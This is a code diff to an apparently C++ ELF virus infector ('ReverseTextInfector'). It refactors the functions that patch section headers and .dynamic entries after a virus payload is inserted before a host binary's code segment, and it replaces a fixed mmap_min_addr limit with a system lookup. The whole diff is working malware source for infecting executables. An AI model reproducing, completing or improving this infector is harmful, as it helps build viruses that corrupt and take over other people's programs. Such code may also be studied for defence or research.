@@ -1,13 +1,13 @@
 #include "infector/reverse_text_infector.hh"
 #include <elf.h>
-#include "common/file_descriptor.hh"
 #include "common/math.hh"
+#include "common/mmap_min_addr.hh"
 #include "nostdlib/stdio.hh"
 #include "nostdlib/string.hh"
 
 namespace vt::infector {
 namespace {
-bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
+void patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
                size_t padded_virus_size,
                Elf64_Off original_code_segment_file_offset,
                Elf64_Addr original_code_segment_p_vaddr) {
@@ -29,7 +29,6 @@ bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
       cur_entry->sh_addr -= padded_virus_size;
     }
   }
-  return true;
 }
 
 // On some arch, the CODE segment would map from the start of the elf (aarch64)
@@ -120,14 +119,14 @@ bool does_entry_contain_address(Elf64_Xword tag) {
 // be patched accordingly. This function searches through all entries in
 // .dynamic section and shift those pointers forward if they have a smaller
 // vaddr than the firs byte of CODE (where we insert the virus).
-bool patch_dyamic(std::span<std::byte> host_mapping, const Elf64_Ehdr& ehdr,
-                  const Elf64_Shdr& shdr,
-                  Elf64_Off original_code_segment_file_offset,
-                  Elf64_Addr original_code_segment_p_vaddr,
-                  uint64_t padded_virus_size) {
+void patch_dynamic(std::span<std::byte> host_mapping, const Elf64_Ehdr& ehdr,
+                   const Elf64_Shdr& shdr,
+                   Elf64_Off original_code_segment_file_offset,
+                   Elf64_Addr original_code_segment_p_vaddr,
+                   uint64_t padded_virus_size) {
   if (original_code_segment_file_offset == 0) {
     // if there is no vaddr adjustment to gnu hash section, skip.
-    return true;
+    return;
   }
 
   auto section_entry_start = &shdr;
@@ -150,10 +149,9 @@ bool patch_dyamic(std::span<std::byte> host_mapping, const Elf64_Ehdr& ehdr,
         }
         dynamic_section_entry++;
       }
-      return true;
+      return;
     }
   }
-  return false;
 }
 
 // This function is a bit involved, please see comments in header why we are
@@ -211,8 +209,8 @@ std::optional<InjectionResult> ReverseTextInfector::inject(
     const auto& shdr =
         reinterpret_cast<const Elf64_Shdr&>(host_mapping[ehdr.e_shoff]);
     // Patch .dynamic section if we touched .gnu.hash
-    patch_dyamic(host_mapping, ehdr, shdr, original_code_segment_file_offset_,
-                 original_code_segment_p_vaddr_, padded_virus_size_);
+    patch_dynamic(host_mapping, ehdr, shdr, original_code_segment_file_offset_,
+                  original_code_segment_p_vaddr_, padded_virus_size_);
   }
 
   {
@@ -284,9 +282,8 @@ bool ReverseTextInfector::analyze(std::span<const std::byte> host_mapping,
       parasite_load_address_ =
           original_code_segment_p_vaddr_ - padded_virus_size_;
 
-      if (parasite_load_address_ < 0x8000) {
-        // most system's mmap_min_addr is 32768. A more reliable way is to read
-        // procfs.
+      if (parasite_load_address_ < common::mmap_min_addr()) {
+        // cannot reverse extend anymore.
         return false;
       }
 
@@ -301,6 +298,7 @@ bool ReverseTextInfector::analyze(std::span<const std::byte> host_mapping,
     }
   }
 
+  // no CODE segment found.
   return false;
 }
 
